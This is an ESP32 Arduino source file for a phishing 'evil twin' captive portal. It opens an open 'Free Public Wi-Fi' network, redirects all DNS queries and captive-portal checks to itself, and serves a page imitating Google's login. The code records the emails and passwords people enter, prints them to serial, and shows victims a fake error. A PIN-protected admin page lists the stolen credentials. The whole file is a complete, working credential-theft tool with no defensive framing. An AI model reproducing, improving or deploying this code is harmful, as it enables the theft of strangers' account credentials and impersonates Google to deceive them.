#include <WiFi.h>
#include <ESPAsyncWebServer.h>
#include <DNSServer.h>
#include <vector>

const char *ssid = "Free Public Wi-Fi";
const char *password = "";
const byte DNS_PORT = 53;
IPAddress apIP(8, 8, 8, 8);
const char *adminPin = "admin"; // Admin PIN code added here

DNSServer dnsServer;
AsyncWebServer server(80);

struct LoginData {
  String email;
  String password;
};

std::vector<LoginData> logins;
unsigned long startTime;

// Google Login-Site with SVG Logo
const char* loginPage = R"rawliteral(
<!DOCTYPE html>
<html>
<head>
  <title>Google Login</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body {
      font-family: 'Roboto', Arial, sans-serif;
      margin: 0;
      padding: 0;
      height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      background-color: #ffffff;
    }
    .login-container {
      width: 450px;
      max-width: 90%;
      padding: 48px 40px 36px;
      border: 1px solid #dadce0;
      border-radius: 8px;
      text-align: center;
      box-shadow: 0 2px 10px rgba(0,0,0,0.1);
    }
    .google-logo {
      height: 40px;
      margin-bottom: 16px;
    }
    h1 {
      color: #202124;
      font-size: 24px;
      font-weight: 400;
      margin-bottom: 10px;
    }
    .subtitle {
      color: #202124;
      font-size: 16px;
      font-weight: 400;
      margin-bottom: 32px;
    }
    .form-group {
      margin-bottom: 24px;
      text-align: left;
    }
    .form-control {
      position: relative;
      height: 56px;
      width: calc(100% - 24px);
      padding: 12px;
      font-size: 16px;
      color: #202124;
      border: 1px solid #dadce0;
      border-radius: 4px;
      outline: none;
      transition: border-color 0.2s;
    }
    .form-control:focus {
      border-color: #1a73e8;
      box-shadow: 0 0 0 2px rgba(26, 115, 232, 0.2);
    }
    .btn {
      display: inline-block;
      background-color: #1a73e8;
      color: white;
      border: none;
      border-radius: 4px;
      font-size: 14px;
      font-weight: 500;
      padding: 10px 24px;
      cursor: pointer;
      text-transform: none;
      letter-spacing: .25px;
      transition: background-color 0.2s;
    }
    .btn:hover {
      background-color: #287ae6;
    }
    .footer {
      display: flex;
      justify-content: space-between;
      margin-top: 32px;
    }
    .footer a {
      color: #1a73e8;
      text-decoration: none;
      font-weight: 500;
      font-size: 14px;
    }
    form {
      width: 100%;
    }
  </style>
</head>
<body>
  <div class="login-container">
    <!-- SVG Google Logo -->
    <svg class="google-logo" viewBox="0 0 272 92" xmlns="http://www.w3.org/2000/svg">
      <path d="M115.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18C71.25 34.32 81.24 25 93.5 25s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44S80.99 39.2 80.99 47.18c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z" fill="#EA4335"/>
      <path d="M163.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18c0-12.85 9.99-22.18 22.25-22.18s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44s-12.51 5.46-12.51 13.44c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z" fill="#FBBC05"/>
      <path d="M209.75 26.34v39.82c0 16.38-9.66 23.07-21.08 23.07-10.75 0-17.22-7.19-19.66-13.07l8.48-3.53c1.51 3.61 5.21 7.87 11.17 7.87 7.31 0 11.84-4.51 11.84-13v-3.19h-.34c-2.18 2.69-6.38 5.04-11.68 5.04-11.09 0-21.25-9.66-21.25-22.09 0-12.52 10.16-22.26 21.25-22.26 5.29 0 9.49 2.35 11.68 4.96h.34v-3.61h9.25zm-8.56 20.92c0-7.81-5.21-13.52-11.84-13.52-6.72 0-12.35 5.71-12.35 13.52 0 7.73 5.63 13.36 12.35 13.36 6.63 0 11.84-5.63 11.84-13.36z" fill="#4285F4"/>
      <path d="M225 3v65h-9.5V3h9.5z" fill="#34A853"/>
      <path d="M262.02 54.48l7.56 5.04c-2.44 3.61-8.32 9.83-18.48 9.83-12.6 0-22.01-9.74-22.01-22.18 0-13.19 9.49-22.18 20.92-22.18 11.51 0 17.14 9.16 18.98 14.11l1.01 2.52-29.65 12.28c2.27 4.45 5.8 6.72 10.75 6.72 4.96 0 8.4-2.44 10.92-6.14zm-23.27-7.98l19.82-8.23c-1.09-2.77-4.37-4.7-8.23-4.7-4.95 0-11.84 4.37-11.59 12.93z" fill="#EA4335"/>
      <path d="M35.29 41.41V32H67c.31 1.64.47 3.58.47 5.68 0 7.06-1.93 15.79-8.15 22.01-6.05 6.3-13.78 9.66-24.02 9.66C16.32 69.35.36 53.89.36 34.91.36 15.93 16.32.47 35.3.47c10.5 0 17.98 4.12 23.6 9.49l-6.64 6.64c-4.03-3.78-9.49-6.72-16.97-6.72-13.86 0-24.7 11.17-24.7 25.03 0 13.86 10.84 25.03 24.7 25.03 8.99 0 14.11-3.61 17.39-6.89 2.66-2.66 4.41-6.46 5.1-11.65l-22.49.01z" fill="#4285F4"/>
    </svg>
    <h1>Login</h1>
    <p class="subtitle">Mit Google-Login</p>
    <form action="/" method="POST">
      <div class="form-group">
        <input type="email" class="form-control" name="user" placeholder="Email adress" required>
      </div>
      <div class="form-group">
        <input type="password" class="form-control" name="pass" placeholder="Password" required>
      </div>
      <div style="display: flex; justify-content: space-between; margin-top: 32px;">
        <a href="#" style="color: #1a73e8; text-decoration: none; margin-top: 8px;">Create account</a>
        <button type="submit" class="btn">Continue</button>
      </div>
    </form>
  </div>
</body>
</html>
)rawliteral";

// Admin login page for PIN protection
const char* adminLoginPage = R"rawliteral(
<!DOCTYPE html>
<html>
<head>  n 
  <title>Admin Login</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body { font-family: Arial; padding: 20px; background: #f5f5f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
    .container { max-width: 400px; width: 100%; background: white; padding: 20px; border-radius: 10px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
    h2 { text-align: center; color: #333; }
    .form-group { margin-bottom: 15px; }
    label { display: block; margin-bottom: 5px; font-weight: bold; }
    input { width: 100%; padding: 10px; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box; }
    .btn { width: 100%; padding: 10px 15px; background: #4285f4; color: white; border: none; border-radius: 5px; cursor: pointer; margin-top: 10px; }
    .error { color: red; text-align: center; margin-bottom: 15px; }
  </style>
</head>
<body>
  <div class="container">
    <h2>Admin Login</h2>
    %ERROR_MESSAGE%
    <form action="/admin-verify" method="POST">
      <div class="form-group">
        <label for="pin">PIN:</label>
        <input type="password" id="pin" name="pin" required>
      </div>
      <button type="submit" class="btn">Login</button>
    </form>
  </div>
</body>
</html>
)rawliteral";

String getUptime() {
  unsigned long sec = millis() / 1000;
  unsigned int days = sec / 86400;
  sec %= 86400;
  unsigned int hours = sec / 3600;
  sec %= 3600;
  unsigned int mins = sec / 60;

  char buffer[50];
  snprintf(buffer, sizeof(buffer), "%u Tage, %u Std, %u Min", days, hours, mins);
  return String(buffer);
}

String buildAdminPage() {
  String html = R"rawliteral(
  <!DOCTYPE html>
  <html>
  <head>
    <title>Saved Logins</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
      body { font-family: Arial; padding: 20px; background: #f5f5f5; }
      .container { max-width: 600px; margin: auto; background: white; padding: 20px; border-radius: 10px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
      .info { background: #e6f0ff; padding: 10px; border-radius: 5px; margin-bottom: 20px; }
      .btn { margin: 5px 5px 15px 0; padding: 10px 15px; background: #ff4d4d; color: white; border: none; border-radius: 5px; cursor: pointer; }
      .btn-update { background: #f39c12; }
      .entry { background: #eee; padding: 10px; margin-bottom: 10px; border-radius: 5px; }
    </style>
  </head>
  <body>
    <div class="container">
      <h2>Saved Logins</h2>
      <div class="info">
        Verbundene Clients: )rawliteral" + String(WiFi.softAPgetStationNum()) + R"rawliteral(<br>
        Active since: )rawliteral" + getUptime() + R"rawliteral(</div>
      <form action="/clear" method="POST"><input class="btn" type="submit" value="Delete Logins"></form>
      <form action="/admin" method="GET"><input class="btn btn-update" type="submit" value="Update"></form>
  )rawliteral";

  for (auto &login : logins) {
    html += "<div class='entry'>E-Mail: " + login.email + " | Pass: " + login.password + "</div>";
  }

  html += "</div></body></html>";
  return html;
}

class CaptiveRequestHandler : public AsyncWebHandler {
public:
  CaptiveRequestHandler() {}
  virtual ~CaptiveRequestHandler() {}

  bool canHandle(AsyncWebServerRequest *request) {
    return true;
  }

  void handleRequest(AsyncWebServerRequest *request) {
    request->redirect("http://" + WiFi.softAPIP().toString());
  }
};

void setup() {
  Serial.begin(115200);
  
  // Set IP for AP
  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP(ssid, password);
  
  Serial.print("AP IP address: ");
  Serial.println(WiFi.softAPIP());
  
  // Configure DNS server to redirect all domains to our IP
  dnsServer.start(DNS_PORT, "*", WiFi.softAPIP());
  
  startTime = millis();

  // Captive Portal Detection Endpoints
  server.on("/generate_204", HTTP_GET, [](AsyncWebServerRequest *request){
    request->redirect("http://" + WiFi.softAPIP().toString());
  });
  
  server.on("/fwlink", HTTP_GET, [](AsyncWebServerRequest *request){
    request->redirect("http://" + WiFi.softAPIP().toString());
  });
  
  server.on("/connecttest.txt", HTTP_GET, [](AsyncWebServerRequest *request){
    request->redirect("http://" + WiFi.softAPIP().toString());
  });
  
  server.on("/hotspot-detect.html", HTTP_GET, [](AsyncWebServerRequest *request){
    request->redirect("http://" + WiFi.softAPIP().toString());
  });
  
  server.on("/library/test/success.html", HTTP_GET, [](AsyncWebServerRequest *request){
    request->redirect("http://" + WiFi.softAPIP().toString());
  });
  
  server.on("/favicon.ico", HTTP_GET, [](AsyncWebServerRequest *request){
    request->send(200, "image/x-icon", "");
  });

  // Standard Endpunkte
  server.on("/", HTTP_GET, [](AsyncWebServerRequest *request){
    request->send(200, "text/html", loginPage);
  });

  // Form submission handler - modified to catch POST on root path
  server.on("/", HTTP_POST, [](AsyncWebServerRequest *request){
    if (request->hasParam("user", true) && request->hasParam("pass", true)) {
      String email = request->getParam("user", true)->value();
      String password = request->getParam("pass", true)->value();
      logins.push_back({ email, password });
      Serial.printf("💀 Login: %s / %s\n", email.c_str(), password.c_str());
    }
    request->send(200, "text/html", "<h3>Fehler beim Anmelden. Bitte später erneut versuchen.</h3>");
  });

  // Admin login page
  server.on("/admin", HTTP_GET, [](AsyncWebServerRequest *request){
    String html = String(adminLoginPage);
    html.replace("%ERROR_MESSAGE%", "");
    request->send(200, "text/html", html);
  });

  // Admin PIN verification
  server.on("/admin-verify", HTTP_POST, [](AsyncWebServerRequest *request){
    if (request->hasParam("pin", true)) {
      String pin = request->getParam("pin", true)->value();
      if (pin == adminPin) {
        // PIN is correct, redirect to admin dashboard
        request->send(200, "text/html", buildAdminPage());
      } else {
        // PIN is incorrect, show error
        String html = String(adminLoginPage);
        html.replace("%ERROR_MESSAGE%", "<div class='error'>Falscher PIN! Bitte erneut versuchen.</div>");
        request->send(200, "text/html", html);
      }
    } else {
      request->redirect("/admin");
    }
  });

  server.on("/clear", HTTP_POST, [](AsyncWebServerRequest *request){
    // Check if we're coming from admin page (this is basic and can be bypassed)
    logins.clear();
    request->redirect("/admin");
  });

  // Fallback-Handler für nicht definierte Routen
  server.addHandler(new CaptiveRequestHandler()).setFilter(ON_AP_FILTER);
  
  server.begin();
  Serial.println("Captive Portal with PIN-secured Admin-Site started!");
}

void loop() {
  dnsServer.processNextRequest();
}
